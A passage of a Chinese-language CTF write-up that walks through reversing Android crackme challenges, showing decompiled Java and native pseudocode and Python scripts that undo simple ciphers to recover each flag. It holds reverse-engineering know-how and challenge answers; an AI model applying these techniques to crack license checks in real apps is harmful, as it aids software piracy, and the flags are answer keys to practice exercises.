Integer.valueOf(bVar.b().intValue() / 25); // 将bVar中d的值除以25并赋值给valueOf            if (valueOf.intValue() &gt; i2 &amp;&amp; valueOf.intValue() &gt;= 1) {                i2++;            }            i++;        }        return Boolean.valueOf(stringBuilder.toString().equals(&quot;wigwrkaugala&quot;));    }    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        findViewById(R.id.button).setOnClickListener(new OnClickListener(this) {            final /* synthetic */ MainActivity b;            public void onClick(View view) {                if (MainActivity.b(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString()).booleanValue()) {                    Toast.makeText(this, &quot;You are right!&quot;, 1).show();                    return;                }                Toast.makeText(this, &quot;You are wrong! Bye~&quot;, 1).show();                new Timer().schedule(new TimerTask(this) {                    final /* synthetic */ AnonymousClass1 a;                    {                        this.a = r1;                    }                    public void run() {                        System.exit(1);                    }                }, 2000);            }        });    }}</code></pre><p>a 类的构造函数，是对数组 c 的重新排列。然后在 <code>a()</code> 函数中对输入的数字和下标进行转换：</p><pre><code class="java">package com.a.easyjava;import java.util.ArrayList;public class a {    public static ArrayList&lt;Integer&gt; a = new ArrayList();    static String b = &quot;abcdefghijklmnopqrstuvwxyz&quot;;    static Integer d = Integer.valueOf(0);    Integer[] c = new Integer[]{Integer.valueOf(7), Integer.valueOf(14), Integer.valueOf(16), Integer.valueOf(21), Integer.valueOf(4), Integer.valueOf(24), Integer.valueOf(25), Integer.valueOf(20), Integer.valueOf(5), Integer.valueOf(15), Integer.valueOf(9), Integer.valueOf(17), Integer.valueOf(6), Integer.valueOf(13), Integer.valueOf(3), Integer.valueOf(18), Integer.valueOf(12), Integer.valueOf(10), Integer.valueOf(19), Integer.valueOf(0), Integer.valueOf(22), Integer.valueOf(2), Integer.valueOf(11), Integer.valueOf(23), Integer.valueOf(1), Integer.valueOf(8)};    public a(Integer num) {        int intValue;        for (intValue = num.intValue(); intValue &lt; this.c.length; intValue++) {            a.add(this.c[intValue]);        }        for (intValue = 0; intValue &lt; num.intValue(); intValue++) {            a.add(this.c[intValue]);        }    }    public static void a() {        Integer num = d;        d = Integer.valueOf(d.intValue() + 1); // 将d加一        if (d.intValue() == 25) { // 判断d是否等于25            int intValue = ((Integer) a.get(0)).intValue();            a.remove(0);            a.add(Integer.valueOf(intValue)); // 将a的第一个元素添加到最后一位            d = Integer.valueOf(0); // 将d设置成0        }    }    public char a(Integer num) {        int i = 0;        Integer valueOf = Integer.valueOf(0);        if (num.intValue() == -10) { // 判断num是否为-10            a();            return &quot; &quot;.charAt(0);        }        while (i &lt; a.size() - 1) {            if (a.get(i) == num) {                valueOf = Integer.valueOf(i); // 获取a中等于num的元素，并将valueOf设置成其下标i            }            i++;        }        a();        return b.charAt(valueOf.intValue()); // 返回下标对应的b中的字符    }}</code></pre><p>b 类中同理，也是对下标的一个转换：</p><pre><code class="java">package com.a.easyjava;import java.util.ArrayList;public class b {    public static ArrayList&lt;Integer&gt; a = new ArrayList();    static String b = &quot;abcdefghijklmnopqrstuvwxyz&quot;;    static Integer d = Integer.valueOf(0);    Integer[] c = new Integer[]{Integer.valueOf(8), Integer.valueOf(25), Integer.valueOf(17), Integer.valueOf(23), Integer.valueOf(7), Integer.valueOf(22), Integer.valueOf(1), Integer.valueOf(16), Integer.valueOf(6), Integer.valueOf(9), Integer.valueOf(21), Integer.valueOf(0), Integer.valueOf(15), Integer.valueOf(5), Integer.valueOf(10), Integer.valueOf(18), Integer.valueOf(2), Integer.valueOf(24), Integer.valueOf(4), Integer.valueOf(11), Integer.valueOf(3), Integer.valueOf(14), Integer.valueOf(19), Integer.valueOf(12), Integer.valueOf(20), Integer.valueOf(13)};    public b(Integer num) {        int intValue;        for (intValue = num.intValue(); intValue &lt; this.c.length; intValue++) {            a.add(this.c[intValue]);        }        for (intValue = 0; intValue &lt; num.intValue(); intValue++) {            a.add(this.c[intValue]);        }    }    public static void a() {        int intValue = ((Integer) a.get(0)).intValue();        a.remove(0);        a.add(Integer.valueOf(intValue)); // 将a的第一个元素添加到最后一位        b += &quot;&quot; + b.charAt(0);        b = b.substring(1, 27); // 将b的第一个元素添加到最后一位        Integer num = d;        d = Integer.valueOf(d.intValue() + 1); // 将d加一    }    public Integer a(String str) {        int i = 0;        Integer valueOf = Integer.valueOf(0);        if (b.contains(str.toLowerCase())) { // 判断字符串是否在“abcdefghijklmnopqrstuvwxyz”中            Integer valueOf2 = Integer.valueOf(b.indexOf(str)); // str在b中的起始下标            while (i &lt; a.size() - 1) {                if (a.get(i) == valueOf2) { // 获取a中与valueOf2相等的值，并设置valueOf为其下标i                    valueOf = Integer.valueOf(i);                }                i++;            }        } else {            valueOf = str.contains(&quot; &quot;) ? Integer.valueOf(-10) : Integer.valueOf(-1); // 判断字符串中是否有空格，如果有valueOf设置成-10，反之设置成-1        }        a();        return valueOf;    }    public Integer b() {        return d;    }}</code></pre><p>其中有很多条件判断不可能发生，实际的算法逻辑没有反编译出的代码这么复杂。逆向实现脚本：</p><pre><code class="python">#!/usr/bin/env pythonbArray = [17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25]aArray = [21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]ciphertext = &#39;wigwrkaugala&#39;table = &#39;abcdefghijklmnopqrstuvwxyz&#39;valueOfArray = []for i in range(len(ciphertext)):    valueOfArray.append(table.index(ciphertext[i]))print valueOfArraynumArray = []for i in range(len(valueOfArray)):    numArray.append(aArray[valueOfArray[i]])print numArrayprefix = &#39;flag{&#39;suffix = &#39;}&#39;substring = &#39;&#39;for i in range(len(numArray)):    ch = table[bArray[numArray[i]]]    substring += ch    bArray.append(bArray[0])    del bArray[0]    table = (table + table[0])[1:27]flag = prefix + substring + suffixprint flag</code></pre><h1 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h1><p>反编译，其中调用了 a 函数，其中调用了 a 类中的 a 函数和在 libnative.so 实现的 ncheck 函数：</p><pre><code class="java">package com.a.easyjni;import android.os.Bundle;import android.support.v7.app.c;import android.view.View;import android.view.View.OnClickListener;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends c {    static {        System.loadLibrary(&quot;native&quot;);    }    private boolean a(String str) {        try {            return ncheck(new a().a(str.getBytes()));        } catch (Exception e) {            return false;        }    }    private native boolean ncheck(String str);    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        findViewById(R.id.button).setOnClickListener(new OnClickListener(this) {            final /* synthetic */ MainActivity b;            public void onClick(View view) {                if (this.b.a(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString())) {                    Toast.makeText(this, &quot;You are right!&quot;, 1).show();                } else {                    Toast.makeText(this, &quot;You are wrong! Bye~&quot;, 1).show();                }            }        });    }}</code></pre><p>a 类里的 a 函数很容易发现是个换表 base64：</p><pre><code class="java">package com.a.easyjni;public class a {    private static final char[] a = new char[]{&#39;i&#39;, &#39;5&#39;, &#39;j&#39;, &#39;L&#39;, &#39;W&#39;, &#39;7&#39;, &#39;S&#39;, &#39;0&#39;, &#39;G&#39;, &#39;X&#39;, &#39;6&#39;, &#39;u&#39;, &#39;f&#39;, &#39;1&#39;, &#39;c&#39;, &#39;v&#39;, &#39;3&#39;, &#39;n&#39;, &#39;y&#39;, &#39;4&#39;, &#39;q&#39;, &#39;8&#39;, &#39;e&#39;, &#39;s&#39;, &#39;2&#39;, &#39;Q&#39;, &#39;+&#39;, &#39;b&#39;, &#39;d&#39;, &#39;k&#39;, &#39;Y&#39;, &#39;g&#39;, &#39;K&#39;, &#39;O&#39;, &#39;I&#39;, &#39;T&#39;, &#39;/&#39;, &#39;t&#39;, &#39;A&#39;, &#39;x&#39;, &#39;U&#39;, &#39;r&#39;, &#39;F&#39;, &#39;l&#39;, &#39;V&#39;, &#39;P&#39;, &#39;z&#39;, &#39;h&#39;, &#39;m&#39;, &#39;o&#39;, &#39;w&#39;, &#39;9&#39;, &#39;B&#39;, &#39;H&#39;, &#39;C&#39;, &#39;M&#39;, &#39;D&#39;, &#39;p&#39;, &#39;E&#39;, &#39;a&#39;, &#39;J&#39;, &#39;R&#39;, &#39;Z&#39;, &#39;N&#39;};    public String a(byte[] bArr) {        StringBuilder stringBuilder = new StringBuilder();        for (int i = 0; i &lt;= bArr.length - 1; i += 3) {            byte[] bArr2 = new byte[4];            byte b = (byte) 0;            for (int i2 = 0; i2 &lt;= 2; i2++) {                if (i + i2 &lt;= bArr.length - 1) {                    bArr2[i2] = (byte) (b | ((bArr[i + i2] &amp; 255) &gt;&gt;&gt; ((i2 * 2) + 2)));                    b = (byte) ((((bArr[i + i2] &amp; 255) &lt;&lt; (((2 - i2) * 2) + 2)) &amp; 255) &gt;&gt;&gt; 2);                } else {                    bArr2[i2] = b;                    b = (byte) 64;                }            }            bArr2[3] = b;            for (int i3 = 0; i3 &lt;= 3; i3++) {                if (bArr2[i3] &lt;= (byte) 63) {                    stringBuilder.append(a[bArr2[i3]]);                } else {                    stringBuilder.append(&#39;=&#39;);                }            }        }        return stringBuilder.toString();    }}</code></pre><p>查看 native 层 ncheck 函数，是静态注册的。理一下发现是个简单的置换：</p><pre><code class="cpp">signed int __fastcall Java_com_a_easyjni_MainActivity_ncheck(_JNIEnv *a1, int a2, jstring a3){  int v3; // r8  _JNIEnv *env; // r5  jstring str; // r8  const char *utf_string; // r6  int i; // r0  char *v8; // r2  char v9; // r1  int j; // r0  bool v11; // nf  unsigned __int8 v12; // vf  int v13; // r1  signed int result; // r0  char s1[32]; // [sp+3h] [bp-35h]  char tmp; // [sp+23h] [bp-15h]  int v17; // [sp+28h] [bp-10h]  v17 = v3;  env = a1;  str = a3;  utf_string = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, 0);  if ( strlen(utf_string) == 32 )               // len(str) == 32  {    i = 0;    do    {      v8 = &amp;s1[i];      s1[i] = utf_string[i + 16];               // s1[i] = str[i + 16]      v9 = utf_string[i++];      v8[16] = v9;                              // s1[i + 16] = str[i]    }    while ( i != 16 );    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string);    j = 0;    do    {      v12 = __OFSUB__(j, 30);      v11 = j - 30 &lt; 0;      tmp = s1[j];      s1[j] = s1[j + 1];      s1[j + 1] = tmp;                          // s1[j], s1[j + 1] = s1[j + 1], s1[j]      j += 2;    }    while ( v11 ^ v12 );                        // while j &lt;= 30    v13 = memcmp(s1, &quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;, 0x20u);    result = 0;    if ( !v13 )      result = 1;  }  else  {    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string);    result = 0;  }  return result;}</code></pre><p>逆向把位置颠倒的字符串倒回去，再用改表的 base64 解码：</p><pre><code class="python">#!/usr/bin/env pythonfrom base64 import *base64_charset = &#39;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN=&#39;ciphertext = &#39;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&#39;ciphertext = [ord(c) for c in ciphertext]for i in range(len(ciphertext) / 2):    ciphertext[2 * i], ciphertext[2 * i + 1] = ciphertext[2 * i + 1], ciphertext[2 * i]print ciphertextfor i in range(len(ciphertext) / 2):    ciphertext[i], ciphertext[i + 16] = ciphertext[i + 16], ciphertext[i]print ciphertextciphertext = &#39;&#39;.join([chr(c) for c in ciphertext])print ciphertext# QAoOQMPFks1BsB7cbM3TQsXg30i9g3==plaintext = decipher(ciphertext)print plaintext# flag{just_ANot#er_@p3}</code></pre><h1 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h1><p>用 jadx 反编译后，看到调用了 cyberpeace 类中的 CheckString 函数：</p><pre><code class="java">package com.testjava.jack.pingan2;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() {            public void onClick(View v) {                if (cyberpeace.CheckString(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString()) == 1) {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u901a\u8fc7!&quot;, 1).show(); // 验证通过!                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u5931\u8d25!&quot;, 1).show(); // 验证失败!                }            }        });    }}</code></pre><p>看到函数在 Native 层实现：</p><pre><code class="java">package com.testjava.jack.pingan2;public class cyberpeace {    public static native int CheckString(String str);    static {        System.loadLibrary(&quot;cyberpeace&quot;);    }}</code></pre><p>发现是静态实现的函数，其中将输入调用了 TestDec，并将结果和指定字符串比较：</p><pre><code class="cpp">signed int __fastcall Java_com_testjava_jack_pingan2_cyberpeace_CheckString(_JNIEnv *a1, int a2, jstring *str){  signed int v3; // r8  const char *str_1; // r9  int v5; // r6  const char *v6; // r5  signed int v7; // r1  v3 = 0;  str_1 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, str, 0);  v5 = strlen(str_1);  v6 = (const char *)malloc(v5 + 1);  v7 = 0;  if ( v5 != -1 )    v7 = 1;  _aeabi_memclr(&amp;v6[v5], v7);  _aeabi_memcpy((int)v6, (int)str_1, v5);  j_TestDec((int)v6);  if ( !strcmp(v6, &quot;f72c5a36569418a20907b55be5bf95ad&quot;) )    v3 = 1;  return v3;}</code></pre><p>看一下 TestDec 发现和之前一样，也是一组简单置换：</p><pre><code class="cpp">size_t __fastcall TestDec(const char *a1){  char *str; // r4  size_t i; // r5  char *v3; // r1  char v4; // r0  size_t result; // r0  int j; // r5  char *v7; // r0  char v8; // r1  unsigned int v9; // r1  str = (char *)a1;  if ( strlen(a1) &gt;= 2 )  {    i = 0;    do    {      v3 = &amp;str[i];      v4 = str[i];      str[i] = str[i + 16];      ++i;      v3[16] = v4;                              // str[i], str[i + 16] = str[i + 16], str[i]    }    while ( i &lt; strlen(str) &gt;&gt; 1 );  }  result = (unsigned __int8)*str;  if ( !*str )    return result;  *str = str[1];  str[1] = result;                              // str[0], str[1] = str[1], str[0]  result = strlen(str);  if ( result &lt; 3 )    return result;  j = 0;  do  {    v7 = &amp;str[j];    v8 = str[j + 2];    v7[2] = str[j + 3];    v7[3] = v8;                                 // str[j + 2], str[j + 3] = str[j + 3], str[j + 2]    result = strlen(str);    v9 = j + 4;    j += 2;  }  while ( v9 &lt; result );  return result;}</code></pre><p>照样学样逆一下就好了：</p><pre><code class="python">#!/usr/bin/env pythonciphertext = &#39;f72c5a36569418a20907b55be5bf95ad&#39;ciphertext = [ord(c) for c in ciphertext]ciphertext[0], ciphertext[1] = ciphertext[1], ciphertext[0]for i in range(len(ciphertext) / 2 - 1):    ciphertext[2 * i + 2], ciphertext[2 * i + 3] = ciphertext[2 * i + 3], ciphertext[2 * i + 2]print ciphertextfor i in range(len(ciphertext) / 2):    ciphertext[i], ciphertext[i + 16] = ciphertext[i + 16], ciphertext[i]print ciphertextplaintext = &#39;&#39;.join([chr(c) for c in ciphertext])print plaintext# 90705bb55efb59da7fc2a5636549812a</code></pre><h1 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h1><p>MainActivity 中，encrypt 和 getFlag 函数在 Native 层实现，getSecret 函数返回某种哈希摘要的十六进制字符串。输入经过 encrypt 函数操作后的值与 getFlag 的值相等：</p><pre><code class="java">package com.ph0en1x.android_crackme;import android.os.Bundle;import android.support.v4.view.MotionEventCompat;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.EditText;import android.widget.Toast;import java.io.UnsupportedEncodingException;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends AppCompatActivity {    EditText etFlag;    public native String encrypt(String str);    public native String getFlag();    static {        System.loadLibrary(&quot;phcm&quot;);    }    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        this.etFlag = (EditText) findViewById(R.id.flag_edit);    }    public void onGoClick(View v) {        if (getSecret(getFlag()).equals(getSecret(encrypt(this.etFlag.getText().toString())))) {            Toast.makeText(this, &quot;Success&quot;, 1).show();        } else {            Toast.makeText(this, &quot;Failed&quot;, 1).show();        }    }    public String getSecret(String string) { // 获取某种哈希摘要的十六进制字符串        try {            byte[] hash = MessageDigest.getInstance(encrypt(&quot;KE3TLNE6M43EK4GM34LKMLETG&quot;).substring(5, 8)).digest(string.getBytes(&quot;UTF-8&quot;));            if (hash != null) {                StringBuilder hex = new StringBuilder(hash.length * 2);                for (byte b : hash) {                    if ((b &amp; MotionEventCompat.ACTION_MASK) &lt; 16) {                        hex.append(&quot;0&quot;);                    }                    hex.append(Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK));                }                return hex.toString();            }        } catch (NoSuchAlgorithmException e) {            e.printStackTrace();        } catch (UnsupportedEncodingException e2) {            e2.printStackTrace();        }        return null;    }}</code></pre><p>在 IDA 中看到静态注册的 encrypt 函数，对字符串的每个值进行了减一操作：</p><pre><code class="cpp">jstring __fastcall Java_com_ph0en1x_android_1crackme_MainActivity_encrypt(_JNIEnv *a1, int a2, jstring a3){  _JNIEnv *v3; // r6  const char *v4; // r4  const char *i; // r5  v3 = a1;  v4 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, 0);  for ( i = v4; i - v4 &lt; strlen(v4); ++i )    --*i;  return v3-&gt;functions-&gt;NewStringUTF(&amp;v3-&gt;functions, v4);}</code></pre><p>反向加一，得到指定的哈希摘要是 MD5：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibmd5hash = lambda m: hashlib.md5(m).hexdigest()secret_digest = &#39;KE3TLNE6M43EK4GM34LKMLETG&#39;digest_type = &#39;&#39;for i in range(len(secret_digest)):    digest_type += chr(ord(secret_digest[i]) - 1)digest_type = digest_type[5:8]print digest_type# MD5</code></pre><p>接下来看 getFlag 函数，读取内存中 data 的值，在循环中对相邻两个值进行相减并加 1，然后和 key 值异或，最后返回字符串：</p><pre><code class="cpp">jstring __fastcall Java_com_ph0en1x_android_1crackme_MainActivity_getFlag(_JNIEnv *a1){  char *v1; // r4  _JNIEnv *v2; // r7  char *v3; // r3  int v4; // r0  int v5; // r1  char *v6; // r2  char *v7; // r3  int v8; // r0  int v9; // r1  int v10; // r4  int v11; // r0  __int16 v12; // r3  signed int l1; // r8  signed int l2; // r0  char *v15; // r9  char a; // r3  char b; // t1  int idx; // r1  char s; // [sp+4h] [bp-5Ch]  char data_1[40]; // [sp+14h] [bp-4Ch]  char v22; // [sp+40h] [bp-20h]  v1 = data_1;  v2 = a1;  v3 = (char *)&amp;data;  do  {    v4 = *(_DWORD *)v3;                         // low 4 bytes    v3 += 8;    v5 = *((_DWORD *)v3 - 1);                   // high 4 bytes    *(_DWORD *)v1 = v4;    *((_DWORD *)v1 + 1) = v5;    v1 += 8;  }  while ( v3 != &quot;Hello Ph0en1x&quot; );  v6 = &amp;s;  v7 = &quot;Hello Ph0en1x&quot;;  do  {    v8 = *(_DWORD *)v7;    v7 += 8;    v9 = *((_DWORD *)v7 - 1);    *(_DWORD *)v6 = v8;    *((_DWORD *)v6 + 1) = v9;    v10 = (int)(v6 + 8);    v6 += 8;  }  while ( v7 != &quot;0en1x&quot; );  v11 = *(_DWORD *)v7;  v12 = *((_WORD *)v7 + 2);  *(_DWORD *)v10 = v11;  *(_WORD *)(v10 + 4) = v12;  l1 = strlen(&amp;s);                              // len(&#39;Hello Ph0en1x&#39;)  l2 = strlen(data_1) - 1;                      // len(data) - 1  v15 = &amp;data_1[l2];  while ( l2 &gt; 0 )  {    a = *v15 + 1;    *v15 = a;                                   // data[l2] = data[l2] + 1    b = *(v15-- - 1);                           // data[l2 - 1]    idx = l2-- % l1;                            // l2 % l1    v15[1] = ((a - b) ^ *(&amp;v22 + idx - 60)) - 1;// data[l2] = ((data[l2 + 1] - data[l2 - 1]) ^ s[idx]) - 1  }  data_1[0] = (data_1[0] ^ 0x48) - 1;  return v2-&gt;functions-&gt;NewStringUTF(&amp;v2-&gt;functions, data_1);}</code></pre><p>因为涉及到了异或和减法的操作，需要注意到及时和 0xFF 与一下，不然结果会出错。脚本：</p><pre><code class="python">data = [0x2E, 0x36, 0x42, 0x4C, 0x5F, 0xBF, 0xE0, 0x3A, 0xA8, 0xC3, 0x20, 0x63, 0x89, 0xB7, 0xC0, 0x1C, 0x1D, 0x44, 0xC2, 0x28, 0x7F, 0xED, 0x02, 0x0E, 0x5D, 0x66, 0x8F, 0x98, 0xB5, 0xB7, 0xD0, 0x16, 0x4D, 0x83, 0xF8, 0xFB, 0x01, 0x43, 0x47]key = &#39;Hello Ph0en1x&#39;l1 = len(key)l2 = len(data)for i in range(l2 - 1, 0, -1):    data[i] = (((data[i] + 1 - data[i - 1]) ^ ord(key[i % l1])) &amp; 0xFF) - 1data[0] = (data[0] ^ 0x48) - 1flag = &#39;&#39;.join([chr(c + 1) for c in data])print flag# flag{Ar3_y0u_go1nG_70_scarborough_Fair}</code></pre><h1 id="RememberOther"><a href="#RememberOther" class="headerlink" title="RememberOther"></a>RememberOther</h1><p>这道题简直出的莫名其妙，发现如果用户名和密码都为空会返回 True，并且会弹出 strings.xml 中指向的 successed 字符串：</p><pre><code class="java">package com.droider.crackme0201;import android.app.Activity;import android.os.Bundle;import android.support.v4.view.MotionEventCompat;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends Activity {    private Button btn_register;    private EditText edit_sn;    private EditText edit_userName;    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        setTitle(R.string.unregister);        this.edit_userName = (EditText) findViewById(R.id.edit_username);        this.edit_sn = (EditText) findViewById(R.id.edit_sn);        this.btn_register = (Button) findViewById(R.id.button_register);        this.btn_register.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                if (MainActivity.this.checkSN(MainActivity.this.edit_userName.getText().toString().trim(), MainActivity.this.edit_sn.getText().toString().trim())) {                    Toast.makeText(MainActivity.this, R.string.successed, 0).show();                    MainActivity.this.btn_register.setEnabled(false);                    MainActivity.this.setTitle(R.string.registered);                    return;                }                Toast.makeText(MainActivity.this, R.string.unsuccessed, 0).show();            }        });    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.activity_main, menu);        return true;    }    private boolean checkSN(String userName, String sn) {        try {            if (userName.length() == 0 &amp;&amp; sn.length() == 0) {                return true;            }            if (userName == null || userName.length() == 0) {                return false;            }            if (sn == null || sn.length() != 16) {                return false;            }            MessageDigest digest = MessageDigest.getInstance(&quot;MD5&quot;);            digest.reset();            digest.update(userName.getBytes());            String hexstr = toHexString(digest.digest(), BuildConfig.FLAVOR);            StringBuilder sb = new StringBuilder();            for (int i = 0; i &lt; hexstr.length(); i += 2) {                sb.append(hexstr.charAt(i));            }            if (sb.toString().equalsIgnoreCase(sn)) {                return true;            }            return false;        } catch (NoSuchAlgorithmException e) {            e.printStackTrace();            return false;        }    }    private static String toHexString(byte[] bytes, String separator) {        StringBuilder hexString = new StringBuilder();        for (byte b : bytes) {            String hex = Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK);            if (hex.length() == 1) {                hexString.append(&#39;0&#39;);            }            hexString.append(hex).append(separator);        }        return hexString.toString();    }}</code></pre><p>在资源中找到指定的字符串：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;resources&gt;    &lt;string name=&quot;app_name&quot;&gt;Crackme0201&lt;/string&gt;    &lt;string name=&quot;hint_sn&quot;&gt;请输入16位的注册码&lt;/string&gt;    &lt;string name=&quot;hint_username&quot;&gt;请输入用户名&lt;/string&gt;    &lt;string name=&quot;info&quot;&gt;Xman Android&lt;/string&gt;    &lt;string name=&quot;menu_settings&quot;&gt;Settings&lt;/string&gt;    &lt;string name=&quot;register&quot;&gt;注 册&lt;/string&gt;    &lt;string name=&quot;registered&quot;&gt;程序已注册&lt;/string&gt;    &lt;string name=&quot;sn&quot;&gt;注册码：&lt;/string&gt;    &lt;string name=&quot;successed&quot;&gt;md5:b3241668ecbeb19921fdac5ac1aafa69&lt;/string&gt;    &lt;string name=&quot;title_activity_main&quot;&gt;Crackme&lt;/string&gt;    &lt;string name=&quot;unregister&quot;&gt;程序未注册&lt;/string&gt;    &lt;string name=&quot;unsuccessed&quot;&gt;无效用户名或注册码&lt;/string&gt;    &lt;string name=&quot;username&quot;&gt;用户名：&lt;/string&gt;&lt;/resources&gt;</code></pre><p>搜一下 MD5，得到原字符串为 <code>YOU_KNOW_</code>。但结果不对，网上找到别人的 wp，说另一半要结合 word 中的提示，出题人说他不懂安卓，那么我们就懂了，flag 就是 <code>YOU_KNOW_ANDROID</code>。</p><h1 id="黑客精神"><a href="#黑客精神" class="headerlink" title="黑客精神"></a>黑客精神</h1><p>这题相比前面的题目开始复杂起来了。在 MainActivity 中，看到一开始对一个 m 的值进行了判断。然后接下来在 onClick 中新建了一个 MyApp 实例，如果 m 为 0 就调用 doRegister 函数，其中跳转到 RegActivity。</p><pre><code class="java">package com.gdufs.xman;import android.app.Activity;import android.app.AlertDialog.Builder;import android.content.ComponentName;import android.content.DialogInterface;import android.content.Intent;import android.os.Bundle;import android.os.Process;import android.util.Log;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;public class MainActivity extends Activity {    private static String workString;    private Button btn1;    public void onCreate(Bundle savedInstanceState) {        String str2;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        String str1 = &quot;Xman&quot;;        Log.d(&quot;com.gdufs.xman m=&quot;, str1);        MyApp myApp = (MyApp) getApplication();        int m = MyApp.m;        if (m == 0) {            str2 = &quot;\u672a\u6ce8\u518c&quot;; // 未注册        } else if (m == 1) {            str2 = &quot;\u5df2\u6ce8\u518c&quot;; // 已注册        } else {            str2 = &quot;\u5df2\u6df7\u4e71&quot;; // 已混乱        }        setTitle(str1 + str2);        this.btn1 = (Button) findViewById(R.id.button1);        this.btn1.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                MyApp myApp = (MyApp) MainActivity.this.getApplication();                if (MyApp.m == 0) {                    MainActivity.this.doRegister();                    return;                }                ((MyApp) MainActivity.this.getApplication()).work();                Toast.makeText(MainActivity.this.getApplicationContext(), MainActivity.workString, 0).show();            }        });    }    public void doRegister() {        new Builder(this).setTitle(&quot;\u6ce8\u518c&quot;).setMessage(&quot;Flag\u5c31\u5728\u524d\u65b9\uff01&quot;).setPositiveButton(&quot;\u6ce8\u518c&quot;, new DialogInterface.OnClickListener() { // Title =&gt; 注册 | Message =&gt; Flag就在前方！ | PositiveButton =&gt; 注册            public void onClick(DialogInterface dialog, int which) {                Intent intent = new Intent();                intent.setComponent(new ComponentName(BuildConfig.APPLICATION_ID, &quot;com.gdufs.xman.RegActivity&quot;));                MainActivity.this.startActivity(intent); // 跳转到RegActivity                MainActivity.this.finish();            }        }).setNegativeButton(&quot;\u4e0d\u73a9\u4e86&quot;, new DialogInterface.OnClickListener() { // NagetiveButton =&gt; 不玩了            public void onClick(DialogInterface dialog, int which) {                Process.killProcess(Process.myPid());            }        }).show();    }    public void work(String str) {        workString = str;    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.menu_main, menu);        return true;    }}</code></pre><p>然后看一下 MyApp 类中，发现分别有三个函数在 Native 层实现。其中 onCreate 中调用了 initSN 函数。SN 猜测是 Serial Number 即序列号：</p><pre><code class="java">package com.gdufs.xman;import android.app.Application;import android.util.Log;public class MyApp extends Application {    public static int m = 0;    public native void initSN();    public native void saveSN(String str);    public native void work();    static {        System.loadLibrary(&quot;myjni&quot;);    }    public void onCreate() {        initSN();        Log.d(&quot;com.gdufs.xman m=&quot;, String.valueOf(m));        super.onCreate();    }}</code></pre><p>RegActivity 中获取输入的字符串，并作为 SN 传入 saveSN 函数。然后 App 将会把自己的进程杀死：</p><pre><code class="java">package com.gdufs.xman;import android.app.Activity;import android.app.AlertDialog.Builder;import android.content.DialogInterface;import android.os.Bundle;import android.os.Process;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class RegActivity extends Activity {    private Button btn_reg;    private EditText edit_sn;    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_reg);        this.btn_reg = (Button) findViewById(R.id.button1);        this.edit_sn = (EditText) findViewById(R.id.editText1);        this.btn_reg.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                String sn = RegActivity.this.edit_sn.getText().toString().trim();                if (sn == null || sn.length() == 0) {                    Toast.makeText(RegActivity.this, &quot;\u60a8\u7684\u8f93\u5165\u4e3a\u7a7a&quot;, 0).show(); // 您的输入为空                    return;                }                ((MyApp) RegActivity.this.getApplication()).saveSN(sn);                new Builder(RegActivity.this).setTitle(&quot;\u56de\u590d&quot;).setMessage(&quot;\u60a8\u7684\u6ce8\u518c\u7801\u5df2\u4fdd\u5b58&quot;).setPositiveButton(&quot;\u597d\u5427&quot;, new DialogInterface.OnClickListener() { // Title =&gt; 回复 | Message 